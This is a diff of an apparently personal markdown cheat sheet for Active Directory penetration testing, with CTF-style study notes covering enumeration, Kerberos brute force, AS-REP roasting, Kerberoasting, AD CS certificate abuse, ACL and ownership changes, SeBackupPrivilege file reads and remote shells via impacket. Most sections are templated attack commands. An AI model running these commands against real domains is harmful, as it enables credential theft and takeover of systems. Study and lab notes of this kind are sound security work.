@@ -5,19 +5,22 @@
 - [Useful links](#useful-links)
 - [Enumeration](#enumeration)
     - [Tools](#tools)
-    - [Default credentials](#default-credentials)
-    - [SMBclient recursively get all](#smbclient-recursively-get-all)
-    - [Exposed clear domain Group Policy GPP](#exposed-clear-domain-group-policy-gpp)
-- [Privilege Escalation](#privilege-escalation)
-    - [Enumeration](#enumeration)
+    - [Privilege Escalation](#privilege-escalation)
         - [Bloodhound](#bloodhound)
-    - [SeBackupPrivilege](#sebackupprivilege)
-    - [Certipy-AD](#certipy-ad)
-    - [WriteOwner privilege](#writeowner-privilege)
-    - [Grant FullControl rights](#grant-fullcontrol-rights)
+- [Default credentials](#default-credentials)
+- [SMBclient recursively get all](#smbclient-recursively-get-all)
+- [Exposed clear domain Group Policy GPP](#exposed-clear-domain-group-policy-gpp)
+- [Kerberos Attacks](#kerberos-attacks)
+    - [Brute force](#brute-force)
+    - [ASREP roast](#asrep-roast)
+    - [Kerberoasting](#kerberoasting)
     - [Kerberos Certificate Misconfiguration exploit](#kerberos-certificate-misconfiguration-exploit)
         - [ESC4](#esc4)
         - [ESC1](#esc1)
+- [SeBackupPrivilege](#sebackupprivilege)
+- [Certipy-AD](#certipy-ad)
+- [WriteOwner privilege](#writeowner-privilege)
+- [Grant FullControl rights](#grant-fullcontrol-rights)
 - [notes from adri TODO](#notes-from-adri-todo)
 
 <!-- /TOC -->
@@ -27,6 +30,8 @@
  - [Active Directory Pentest MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
  - [0-9 Guide to Active Directory Attacks](https://zer1t0.gitlab.io/posts/attacking_ad/)
  - [OSCP-like Labs and Machines](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)
+ - [Kerberos Attacks explained](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+ - [InternalAllTheThings repository](https://swisskyrepo.github.io/InternalAllTheThings/)
 
 # Enumeration
 search for:
@@ -34,20 +39,9 @@ search for:
 - groups
 - RIDs
 
-\
+
 try using default credentials like `guest` and no password\
 repeat enumeration with any other users you find access to
-
-## Privilege Escalation
-- check permission: `whoami /all`
-- search for vulnerable certificates
-- winPEAS
-
-### Bloodhound
-1. Collect data
-    - `bloodhound-python -u {user} -p {password} -d {domain} -ns ip -c All`
-    - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
-2. Import and query
 
 ## Tools
 1. crackmapexec:
@@ -68,10 +62,7 @@ repeat enumeration with any other users you find access to
 6. smbmap:
     - `smbmap -H {target}`
 
-## Default credentials
-- smb: `-u 'guest' -p ''`
-
-## SMBclient recursively get all 
+### SMBclient recursively get all 
 ```
 mask "";
 recurse ON;
@@ -79,49 +70,45 @@ prompt OFF;
 mget *;
 ```
 
-## Exposed clear domain Group Policy (GPP)
-if you find GPP on the smb shares or somewhere, Microsoft pubblished the static AES key. [Learn more here.](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
+## Privilege Escalation
+- check permission: `whoami /all`
+- search for vulnerable certificates
+- winPEAS
+
+### Bloodhound
+1. Collect data
+    - `bloodhound-python -u {user} -p {password} -d {domain} -ns ip -c All`
+    - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
+2. Import and query
+
+# Default credentials
+- smb: `-u 'guest' -p ''`
+
+# Exposed clear domain Group Policy (GPP)
+if you find GPP on the smb shares or somewhere, Microsoft pubblished the static AES key. [Learn more.](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
 - you can use `gpp-decrypt` to crack it.
 
-## Kerberoasting TODO study better: HTB [kerberos](https://academy.hackthebox.com/module/details/25)
-enumerate possibile movement with Kerberos using:
-- `impacket-GetNPUsers {domain} -userfile users.txt {-format hashcat -outputfile output.txt}`
-- `nxc ldap {domain} -u user.txt -p passwords.txt --asreproast output.txt`
-- `impacket-GetUserSPNs {domain} -no--preauth -userfile users.txt -dc-ip {ip}`
-## SeBackupPrivilege
-Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege.git) github repository.
+# Kerberos Attacks
+Enumerate possibile lateral movement. These following attacks are ordered by the privileges required, from lower to highest. [Learn more.](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
-```PS
-Import-Module .\SeBackupPrivilegeUtils.dll
-Import-Module .\SeBackupPrivilegeCmdLets.dll
+## Brute force
+This attacks is efficient on Kerberos due to its verbosity; it indicates whether the username is wrong or not, for example.\
+No privilege is required.
 
-Set-SeBackupPrivilege
-Get-SeBackupPrivilege
+The most common tool is [kerbrute](https://github.com/TarlogicSecurity/kerbrute):
+- `python3 kerbrute.py -domain {domain} -usersfile users.txt -passwords passwords.txt -outputfile output.txt`
 
-# Retrieve sensitive files
-Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
-```
+## ASREP roast
 
-## Certipy-AD
-when you already have a user you can try to extract hashes for other users:
-- `certipy-ad shadow auto -u '{user}@{domain}' -p "{password}" -account '{target_user}' -dc-ip '{ip}'`
+The requirements here is having at least one user without Kerberos `pre-authentication` required. This allows any users to request an `AS_REP` on behalf of any other user and try cracking it to discover the user's password:
+- `impacket-GetNPUsers {domain}/ -userfile users.txt {-format hashcat -outputfile output.txt}`
 
-and also search for vulnerable certificates if you can access the CA_SVC account:
-- `certipy-ad find -u {user}@{domain} -hashes :{hash} -stdout -vulnerable -dc-ip {ip} {-old-bloodhound}`
+## Kerberoasting
 
-## WriteOwner privilege
-- bloodyAD:\
-    `bloodyAD --host '{ip}' -d '{domain}' -u '{user}' -p '{password}' set owner '{target_user}' '{user}'`
-- impacket:\
-`impacket-owneredit -action write -new-owner '{user}' -target '{target_user}' 'domain'/'{user}':'{password}'`
-- PowerView:\
-`Set-DomainObjectOwner -TargetIdentity {target_user} -PrincipalIdentity {user}`
+To perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
 
-## Grant FullControl rights
-- PowerView
-`Add-DomainObjectAcl -TargetIdentity {target_user} -PrincipalIdentity {user} -Rights fullcontrol`
-- impacket
-`impacket-dacledit -action write -rights FullControl -principal {user} -target {target_user} {domain}/{user}:{password}`
+The goal is to search for users that are configured with a SPN, so this means that they act kind of as as Service for which we can requests a TGS to Kerberos, which will be encrypted with the user secret shared key (usually shorted than an actual service/machine password) so then try to crack it:
+- `impacket-GetUserSPNs {domain}/{user}:{password} {-request} {-userfile users.txt}`
 
 ## Kerberos Certificate Misconfiguration exploit
 
@@ -153,8 +140,52 @@ so you log in with evil-winrm using the second part of the HASH
 
 ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.
 
+# Dangerous privilege
 
-## notes from adri TODO
+## SeBackupPrivilege
+Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege.git) github repository.
+
+```PS
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+
+# Retrieve sensitive files
+Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
+```
+
+## WriteOwner privilege
+change owner of a user:
+- bloodyAD:\
+    `bloodyAD --host '{ip}' -d '{domain}' -u '{user}' -p '{password}' set owner '{target_user}' '{user}'`
+- impacket:\
+`impacket-owneredit -action write -new-owner '{user}' -target '{target_user}' 'domain'/'{user}':'{password}'`
+- PowerView:\
+`Set-DomainObjectOwner -TargetIdentity {target_user} -PrincipalIdentity {user}`
+
+# Certipy-AD
+when you already have a user you can try to extract hashes for other users:
+- `certipy-ad shadow auto -u '{user}@{domain}' -p "{password}" -account '{target_user}' -dc-ip '{ip}'`
+
+and also search for vulnerable certificates if you can access the CA_SVC account:
+- `certipy-ad find -u {user}@{domain} -hashes :{hash} -stdout -vulnerable -dc-ip {ip} {-old-bloodhound}`
+
+# Grant FullControl rights
+- PowerView
+`Add-DomainObjectAcl -TargetIdentity {target_user} -PrincipalIdentity {user} -Rights fullcontrol`
+- impacket
+`impacket-dacledit -action write -rights FullControl -principal {user} -target {target_user} {domain}/{user}:{password}`
+
+# Obtain system shell without EvilWinRM
+
+when there is no user in the "Remote Management Group" you can still obtain a shell with any of the following:
+- `impacket-psexec {domain}/{user}:{password}@{ip}`
+- `impacket-wmiexec {domain}/{user}:{password}@{ip}`
+- `impacket-smbexec {domain}/{user}:{password}@{ip}`
+
+# notes from adri TODO
 
 utile anche usare nxc con --debug
 
